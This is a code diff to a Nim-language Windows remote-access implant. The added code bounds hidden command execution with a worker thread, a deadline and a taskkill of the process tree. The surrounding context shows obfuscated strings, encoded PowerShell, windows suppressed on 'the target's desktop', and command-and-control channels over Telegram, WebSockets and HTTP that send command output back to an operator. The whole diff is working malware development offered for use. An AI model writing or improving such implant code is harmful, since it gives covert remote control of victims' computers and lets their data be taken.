@@ -531,17 +531,99 @@ proc psRun(script: string): string =
   obfStr(S_POWERSHELL) & " -NoProfile -NonInteractive -EncodedCommand " &
     base64.encode(bytes)
 
-# Hidden command execution. poDaemon maps to CREATE_NO_WINDOW on Windows -
-# without it every execCmdEx of a console tool (tasklist, netsh,
-# powershell, wmic, schtasks) flashes a visible cmd window on the
+# Hidden, BOUNDED command execution. poDaemon maps to CREATE_NO_WINDOW
+# on Windows - without it every execCmdEx of a console tool (tasklist,
+# netsh, powershell, wmic, schtasks) flashes a visible cmd window on the
 # target's desktop. ALL shell-outs must go through this.
-proc execHidden(command: string): tuple[output: string, code: int] =
+#
+# execCmdEx has no timeout, and the poll loop is single-threaded: one
+# hung child (stuck installer, waiting PowerShell prompt) used to wedge
+# the whole agent. So: run the child on a worker thread, record its PID,
+# enforce a deadline here, and taskkill /T the tree on expiry. Killing
+# the tree closes the pipe handles, which unblocks the worker's readAll.
+const
+  EXEC_MAX_OUT = 1_000_000          # cap captured output at ~1 MB
+  EXEC_TIMEOUT_MS_DEFAULT = 120_000 # matches /help's "timeout 120s"
+
+type ExecArgs = object
+  cmd: array[8192, char]            # NUL-padded command line
+  done: bool                        # published last by the worker
+  code: int
+  outLen: int
+  data: array[EXEC_MAX_OUT, byte]
+
+proc pidsWithParent(parent: int): seq[int] =
+  ## All live PIDs whose parent is `parent` (one Toolhelp snapshot).
+  var snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+  if snap == cast[HANDLE](-1) or snap == 0: return
+  var entry: PROCESSENTRY32W
+  entry.dwSize = DWORD(sizeof(PROCESSENTRY32W))
+  if Process32FirstW(snap, addr entry) != 0:
+    while true:
+      if entry.th32ParentProcessID == DWORD(parent):
+        result.add(int(entry.th32ProcessID))
+      if Process32NextW(snap, addr entry) == 0: break
+  discard CloseHandle(snap)
+
+proc execWorker(a: ptr ExecArgs) {.thread.} =
+  var cmd = ""
+  var i = 0
+  while i < a[].cmd.len and a[].cmd[i] != '\0':
+    cmd.add(a[].cmd[i])
+    inc i
   try:
-    let (outp, code) = execCmdEx(command,
+    # execCmdEx (not startProcess): the startProcess route made
+    # PowerShell emit CLIXML-serialized stdout, which broke parsing.
+    let r = execCmdEx(cmd,
         options = {poStdErrToStdOut, poUsePath, poDaemon})
-    return (outp, code)
+    a[].code = r.exitCode
+    let n = min(r.output.len, EXEC_MAX_OUT)
+    if n > 0:
+      copyMem(addr a[].data[0], unsafeAddr r.output[0], n)
+    a[].outLen = n
+  except CatchableError:
+    a[].code = -1
+    a[].outLen = 0
+  a[].done = true
+
+proc execHidden(command: string,
+                timeoutMs = EXEC_TIMEOUT_MS_DEFAULT): tuple[output: string, code: int] =
+  if command.len >= 8192:
+    return ("[!] exec: command too long", -1)
+  var a = cast[ptr ExecArgs](allocShared0(sizeof(ExecArgs)))
+  defer: deallocShared(cast[pointer](a))
+  for i, ch in command:
+    a[].cmd[i] = ch
+  # Snapshot our children before spawning; on timeout the newly
+  # appeared ones are the culprit's process tree.
+  let before = pidsWithParent(int(GetCurrentProcessId()))
+  var t: Thread[ptr ExecArgs]
+  try:
+    createThread(t, execWorker, a)
   except CatchableError as e:
     return ("[!] exec: " & e.msg, -1)
+  let deadline = getMonoTime() + initDuration(milliseconds = timeoutMs)
+  while not a[].done and getMonoTime() < deadline:
+    sleep(50)
+  if not a[].done:
+    # Hard-kill the child tree; the worker unblocks when execCmdEx's
+    # pipes close on child death.
+    for p in pidsWithParent(int(GetCurrentProcessId())):
+      if p notin before:
+        discard execCmdEx("taskkill /F /T /PID " & $p,
+                          options = {poStdErrToStdOut, poDaemon})
+    var waited = 0
+    while not a[].done and waited < 5000:
+      sleep(100)
+      inc waited, 100
+    if not a[].done:
+      return ("[!] exec timed out after " & $(timeoutMs div 1000) & "s", -1)
+
+  let n = a[].outLen
+  var outp = newString(n)
+  if n > 0:
+    copyMem(addr outp[0], addr a[].data[0], n)
+  return (outp, a[].code)
 
 # =============================================================================
 # Runtime configuration - resolved from env vars with compile-time defaults
@@ -1407,6 +1489,8 @@ proc winHttpPostMultipart(host: string, port: int, path: string,
 # (ps lists, /cmd dumps, /find results) is split into chunks. Splits
 # back off to a UTF-8 codepoint boundary so multi-byte chars survive.
 when defined(c2_tg) or defined(c2_both) or defined(c2_ws):
+  const TG_MAX_MSG = 3800
+
   proc utf8Sanitize(s: string): string =
     # Tool output (cmd.exe, PowerShell stderr) comes back in the
     # system's ANSI/OEM codepage, not UTF-8. Telegram rejects any
@@ -1462,8 +1546,6 @@ when defined(c2_tg) or defined(c2_both) or defined(c2_ws):
       dec result
 
 when defined(c2_tg) or defined(c2_both):
-  const TG_MAX_MSG = 3800
-
   proc tgSendText(text: string): bool =
     if BotToken.len == 0 or ChatId.len == 0: return false
     if text.len == 0: return true
